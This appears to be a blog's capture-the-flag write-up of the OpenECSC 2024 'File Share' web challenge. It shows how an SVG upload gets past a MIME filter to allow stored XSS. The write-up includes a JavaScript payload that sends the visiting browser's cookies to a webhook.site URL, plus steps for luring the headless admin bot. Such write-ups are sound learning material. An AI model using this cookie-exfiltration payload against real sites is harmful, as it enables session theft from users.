@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #0f6567;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Open ECSC File Share</title>
+    <meta name="description" content="Cyber Security research blog">
+    <meta name="keywords" content='ctf, cyber security, IT, hackthebox, tryhackme, blog, writeup, ecsc24, web'>
+
+    <meta property="og:url" content="https://www.miast.io/write-ups/fileshare-writeup/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Open ECSC File Share">
+    <meta property="og:description" content="Cyber Security research blog">
+    <meta property="og:image" content="https://www.miast.io/images/miasto.jpg">
+    <meta property="og:image:secure_url" content="https://www.miast.io/images/miasto.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Open ECSC File Share">
+    <meta name="twitter:description" content="Cyber Security research blog">
+    <meta property="twitter:domain" content="https://www.miast.io/write-ups/fileshare-writeup/">
+    <meta property="twitter:url" content="https://www.miast.io/write-ups/fileshare-writeup/">
+    <meta name="twitter:image" content="https://www.miast.io/images/miasto.jpg">
+
+    
+    <link rel="canonical" href="https://www.miast.io/write-ups/fileshare-writeup/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.edd985581bf860dfb4507e5885197f1680160c7fe19f23b31e183126d99dd596.js" integrity="sha256-7dmFWBv4YN&#43;0UH5YhRl/FoAWDH/hnyOzHhgxJtmd1ZY="></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://www.miast.io/">
+                <img src='/images/miasto.jpg' alt="miasto" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://www.miast.io/">Miast.io</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/write-ups/"><span data-feather='book'></span> Write Ups </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/projects/"><span data-feather='code'></span> Projects </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/about/"><span data-feather='info'></span> About </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/write-ups/"><span data-feather='book'></span> Write Ups </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/projects/"><span data-feather='code'></span> Projects </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/about/"><span data-feather='info'></span> About </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Open ECSC File Share</h1>
+        <small role="doc-subtitle"></small>
+        <p class="post-date">22 March, 2024
+        
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/ctf">ctf</a></li>
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/writeup">writeup</a></li>
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/ecsc24">ecsc24</a></li>
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/web">web</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>This is a writeup for the OpenECSC2024 challenge File Share. The source code and official writeup can be found at the official <a href="https://github.com/ECSC2024/openECSC-2024/tree/main/round-1/web02">OpenECSC Github</a>.</p>
+<h1 id="challenge-description">Challenge Description</h1>
+<p>You can now share your files for free thanks to our new disruptive technology!
+Site: <a href="https://fileshare.challs.open.ecsc2024.it">https://fileshare.challs.open.ecsc2024.it</a></p>
+<h1 id="challenge-analysis">Challenge Analysis</h1>
+<p>Reviewing the source code, there are two main points of interest:</p>
+<h3 id="1-supportphp">1. <code>support.php</code></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[a-f0-9]{30}$/&#39;</span>, $fileid) <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#39;HEADLESS_HOST&#39;</span>);
+</span></span><span style="display:flex;"><span>        $chall_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#39;WEB_DOM&#39;</span>);
+</span></span><span style="display:flex;"><span>        $act1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;request&#39;</span>, <span style="color:#e6db74">&#39;url&#39;</span> <span style="color:#f92672">=&gt;</span> $chall_url);
+</span></span><span style="display:flex;"><span>        $act2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;set-cookie&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;flag&#39;</span>, <span style="color:#e6db74">&#39;value&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#39;FLAG&#39;</span>));
+</span></span><span style="display:flex;"><span>        $act3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;type&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;request&#39;</span>, <span style="color:#e6db74">&#39;url&#39;</span> <span style="color:#f92672">=&gt;</span> $chall_url <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/download.php?id=&#39;</span> <span style="color:#f92672">.</span> $fileid);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;actions&#39;</span> <span style="color:#f92672">=&gt;</span> [$act1, $act2, $act3], <span style="color:#e6db74">&#39;browser&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;chrome&#39;</span>);
+</span></span><span style="display:flex;"><span>        $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>($data);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $options <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;http&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;header&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Content-type: application/json</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;X-Auth: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#39;HEADLESS_AUTH&#39;</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;method&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;content&#39;</span> <span style="color:#f92672">=&gt;</span> $data
+</span></span><span style="display:flex;"><span>            )
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $context  <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_context_create</span>($options);
+</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($url, <span style="color:#66d9ef">false</span>, $context);
+</span></span></code></pre></div><p>If a valid file ID is submitted, this sends a POST request to a headless browser service. It includes the flag as a cookie and then requests the file using the provided ID.</p>
+<h3 id="2supportphp">2.<code>support.php</code></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$type <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;type&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// I don&#39;t like the letter &#39;h&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ($type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/h/i&#34;</span>, $type) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>        $type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>This restricts file uploads based on MIME type, rejecting any type containing the letter <code>h</code> (case-insensitive). This prevents PHP/HTML files from being executed, regardless of their extension.</p>
+<p>However, <strong>SVG files</strong> are not blocked, making <strong>stored XSS</strong> possible. So we are able to get stored XSS by uploading an SVG file with some JS.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="step-1--prepare-payload">Step 1 – Prepare Payload</h3>
+<p>Firstly, you want to setup a webhook, or forwarder. I used <a href="https://webhook.site">webhook.site</a> for this. This is where we are going to send the request to get the flag.
+You want to create and upload an SVG file containing JavaScript like below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span>[<span style="color:#a6e22e">CDATA</span>[
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">image</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://webhook.site/XXXX?&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
+</span></span><span style="display:flex;"><span>]]<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><em>Replace <code>https://webhook.site/XXXX</code> with your own webhook URL.</em></p>
+<h3 id="step-2--upload-the-file">Step 2 – Upload the File</h3>
+<ol>
+<li>Navigate to the <strong>Upload</strong> page.</li>
+<li>Submit the malicious SVG file.</li>
+<li>Copy the <strong>file ID</strong> from the generated link after upload.</li>
+</ol>
+<p><img src="/images/ECSC-FIleShare-1.png" alt="Upload"></p>
+<h3 id="step-3--trigger-the-headless-browser">Step 3 – Trigger the Headless Browser</h3>
+<ol>
+<li>Go to the <strong>Support</strong> page.</li>
+<li>Fill in a valid email, the file ID, and any message.</li>
+<li>Submit the form.</li>
+</ol>
+<p><img src="/images/ECSC-fileshare-2.png" alt="Support"></p>
+<h3 id="step-4--capture-the-flag">Step 4 – Capture the Flag</h3>
+<p>Once the headless browser visits your SVG, the embedded script runs, sending its cookies (including the flag) to your webhook.</p>
+<p>Check your webhook:</p>
+<p><img src="/images/ECSC-fileshare-3.png" alt="Flag exfiltrated"></p>
+
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    <svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="topFunction()" title="Go to top">
+        
+        <path d="M177 159.7l136 136c9.4 9.4 9.4 24.6 0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9 0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9 0L7 329.7c-9.4-9.4-9.4-24.6 0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/>
+    </svg>
+    
+    <script>
+        let backToTopButton = document.getElementById("btt-button");
+
+        window.onscroll = function() {
+            scrollFunction()
+        };
+
+        function scrollFunction() {
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                backToTopButton.style.display = "block";
+            } else {
+                backToTopButton.style.display = "none";
+            }
+        }
+
+        function topFunction() {
+            smoothScrollToTop();
+        }
+
+        function smoothScrollToTop() {
+            const scrollToTop = () => {
+                const c = document.documentElement.scrollTop || document.body.scrollTop;
+                if (c > 0) {
+                    window.requestAnimationFrame(scrollToTop);
+                    window.scrollTo(0, c - c / 8);
+                }
+            };
+            scrollToTop();
+        }
+    </script>
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#challenge-analysis">Challenge Analysis</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#1-supportphp">1. <code>support.php</code></a></li>
+            <li><a href="#2supportphp">2.<code>support.php</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#exploitation">Exploitation</a>
+          <ul>
+            <li><a href="#step-1--prepare-payload">Step 1 – Prepare Payload</a></li>
+            <li><a href="#step-2--upload-the-file">Step 2 – Upload the File</a></li>
+            <li><a href="#step-3--trigger-the-headless-browser">Step 3 – Trigger the Headless Browser</a></li>
+            <li><a href="#step-4--capture-the-flag">Step 4 – Capture the Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>&copy; 2025 Miast.io</span>
+    
+
+</footer>
+</body>
+</html>
